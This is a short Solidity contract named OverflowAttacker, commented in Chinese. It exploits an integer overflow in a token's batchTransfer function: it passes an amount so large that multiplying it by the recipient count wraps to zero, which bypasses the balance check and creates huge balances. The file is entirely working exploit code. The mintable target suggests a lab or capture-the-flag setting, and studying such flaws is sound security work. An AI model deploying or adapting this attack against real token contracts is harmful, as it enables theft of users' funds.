// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IToken {
    function mint(uint256 amount) external;
    function balanceOf(address) external view returns (uint256);
    function batchTransfer(address[] calldata recipients, uint256 amount) external returns (bool);
}

/// @title OverflowAttacker - 利用 batchTransfer 乘法溢出
/// 流程: 给自己 mint 一些代币 -> 用 batchTransfer 传入超大金额 -> amount * cnt 溢出回绕到 0
contract OverflowAttacker {
    IToken public t;

    constructor(address _t) {
        t = IToken(_t);
    }

    function attack() external {
        t.mint(100);

        address[] memory rs = new address[](2);
        rs[0] = msg.sender;
        rs[1] = address(this);

        // 2 * amount 溢出回绕到 0，绕过 balanceOf[sender] >= total 检查
        uint256 huge = (type(uint256).max / 2) + 1;
        t.batchTransfer(rs, huge);
    }
}
